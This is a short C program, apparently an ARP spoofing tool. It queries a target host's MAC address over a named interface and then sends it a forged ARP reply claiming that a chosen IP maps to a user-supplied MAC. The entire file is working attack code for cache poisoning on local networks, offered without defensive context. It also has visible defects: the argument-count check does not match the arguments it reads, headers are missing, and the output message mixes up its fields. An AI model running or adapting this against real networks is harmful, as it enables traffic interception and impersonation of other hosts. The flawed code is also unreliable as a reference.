#include <stdio.h>
#include <stdlib.h>
#include "xlayer.h"
#include "datalink.h"
static char *szProgName;
static void
ckerr(int rc, int ec,const char *szMsg)
{
 if(rc == ec){
 	fprintf(stderr,"%s: %s %s\n",szProgName,szMsg,
				(errno==0)?"":strerror(errno));
	exit(1);
 }				
} 

int
main(int argc, char **argv)
{
	struct MAC real_mac,smac,dmac;
	uint32_t sip, // source ip
                        dip; // dest ip
	char dst_macstr[20];
        
    struct datalink dl;
    
	if(argc < 3 ) {
		fprintf(stderr,"usage: %s <iface> <src ip> <src mac> <dest ip> \n",*argv);
		exit(0);
	}
	szProgName = *argv;
    ckerr(str_to_ip(argv[2],&sip),0,"Invalid IP specified as source\n");
    ckerr(str_to_mac(argv[3],&smac),0,"Invalid source MAC\n");
    ckerr(str_to_ip(argv[4],&dip),0,"Invalid IP specified as destination\n");
	ckerr(if_openbyname(&dl,argv[1]),-1,"Error: interface not configured\n");
        memcpy(real_mac.mac,dl.dl_mac,6);
    ckerr(ARPRequest(&dl,&real_mac,&dmac,sip,dip,5),-1,"error: host did not reply to arp request\n");

    ARPReply(&dl,&smac,sip,&dmac,dip);

	
        mac_to_str(&dmac,dst_macstr,sizeof(dst_macstr));
	printf("%s [ %s ] was told that %s has %s over interface %s\n",argv[4],dst_macstr,
                    argv[2],argv[1],argv[3]);
	return 0;
}

